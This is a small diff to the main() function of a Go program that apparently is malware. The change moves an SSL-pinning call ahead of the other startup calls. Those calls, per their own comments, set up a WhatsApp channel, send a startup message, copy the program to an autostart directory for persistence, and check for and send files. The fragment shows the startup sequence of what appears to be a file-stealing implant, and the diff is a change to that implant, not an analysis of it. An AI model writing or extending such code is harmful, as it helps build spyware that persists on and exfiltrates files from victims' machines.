@@ -17,9 +17,9 @@ func init() {
 }
 
 func main() {
+	secure.SSLPinning()          // ssl pinning
 	wainit.InitWa()              // initialize watsap
 	messages.StartupMessage1()   // send init message
-	secure.SSLPinning()          // ssl pinning
 	go utils.CopySelfToTempDir() // copy self to autostart dir
 	go files.InitFiles()         // initialize files
 	go files.CheckAndSendFiles() // check and send files
